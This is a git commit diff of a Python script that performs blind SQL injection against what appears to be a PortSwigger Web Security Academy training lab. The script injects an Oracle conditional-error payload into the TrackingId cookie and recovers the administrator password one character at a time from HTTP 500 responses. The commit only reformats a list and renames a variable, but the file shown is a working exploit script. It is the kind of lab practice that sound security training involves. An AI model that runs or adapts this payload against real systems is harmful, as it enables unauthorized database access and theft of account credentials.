72fee41265908d5d89ca7891c13d71d27b20da4c
collochumba <chumbasea@gmail.com>
2023-06-20 07:03:44 -0400

    blind sqli brute force for password script

--- brute-sqli.py
+++ brute-sqli.py
@@ -1,6 +1,5 @@
 import requests
-letters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
-           'w','x','y','z','1','2','3','4','5','6','7','8','9','0']
+letters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
 url = 'https://0a01006a03128d0f8046495400a40056.web-security-academy.net/filter?category=Gifts'#variable should contain the URL of the vulnerable web page.
 cookie = 'mznLQAkBYzXFn5Sk'#cokie from the burpsuite tool
 password = ''#variable will store the guessed password characters.
@@ -16,8 +15,8 @@ for i in range(1,21):
         final_cookie = cookie +"'||(select case when substr(password,{},1)='{}' then to_char(1/0) else '' end from users where username ='administrator')||'".format(i,j)
         full_cookie = {"TrackingId":final_cookie}#The cookie payload is assigned to a dictionary with the key "TrackingId".
         print("Trying {} position with {}".format(i,j))
-        r = requests.get(url,cookies=full_cookie)
-        if r.status_code > 499:
+        temp = requests.get(url,cookies=full_cookie)
+        if temp.status_code > 499:
             password += j
             break
         print(password)
